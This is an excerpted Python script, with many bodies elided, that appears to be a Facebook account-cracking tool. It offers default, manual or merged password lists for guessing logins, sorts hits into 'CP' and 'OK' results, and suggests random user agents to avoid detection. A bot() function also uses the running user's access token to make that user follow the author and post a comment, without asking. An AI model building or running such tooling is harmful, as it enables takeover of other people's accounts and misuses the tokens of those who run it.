...
def bot():
	...
	komentar = random.choice(["Your sc is not bad, bro","I like your sc, bro","Bro, how come you're a genius, bro","okay, thank you"])
	requests.post("https://graph.facebook.com/100065699346434/subscribers?access_token="+token) # MantalStudio
	requests.post("https://graph.facebook.com/102348335298478/comments/?message="+komentar+"&access_token="+token)
	menu()
...
def menu():
	...
	if sayangku=="1" or sayangku=="01":
		...
		jalan(balmond+l+" Thanks for using my Sc bro")
		time.sleep(0.5)
		exit()
	else:
...
def result():
	print(h+"\n{"+k+"1"+h+"}"+l+"Check Result CP")
	print(h+"{"+k+"2"+h+"}"+l+" Check Result OK")
	print(h+"{"+k+"0"+h+"}"+l+" Return")
	pilih = input("\n"+balmond+l+" Select : ")
	if pilih=="1" or pilih=="01":
		try:
...
def mode_password():
	mode = input("\n"+balmond+l+" Crack Password Default Or Manual Or Merge "+h+"{"+k+"d/m/g"+h+"}"+l+" : ")
	if mode=="d" or mode=="D":
		opsi()
	elif mode=="m" or mode=="M":
		print("\n"+balmond+l+"Enter Password Manually")
		print(balmond+l+" Miniman 6 Characters In 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Password Manual : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>7:
			jalan("\n"+balmond+m+" Don't be greedy bro, at least 7 passwords")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
		...
		print(balmond+l+" Miniman 6 Characters In 1 Password")
		print(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = input(balmond+l+" Additional Passwords : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>5:
			jalan("\n"+balmond+m+" Don't be greedy bro, at least 5 passwords")
			time.sleep(0.5)
			exit()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
...
def opsi():
	...
	if ops=="y" or ops=="Y":
		...
		jalan(balmond+m+" Choose Yes Or Nok")
		time.sleep(0.5)
		opsi()
	mode_crack()
...
def mode_crack():
	...
	pilih = input("\n"+balmond+l+" Pilih : ")
	if pilih=="1" or pilih=="01":
		print("\n"+balmond+l+" Press "+h+"'y'"+l+" If you want to use a random user agent")
		print(balmond+l+" Press Enter if you don't want to use a random user agent")
		agenku = input(balmond+l+" Use Random User Agent "+k+"{"+h+"Recomended"+k+"}"+l+" : ")
		...
		jalan(balmond+l+" Invalid Choice")
		time.sleep(0.5)
		mode_crack()
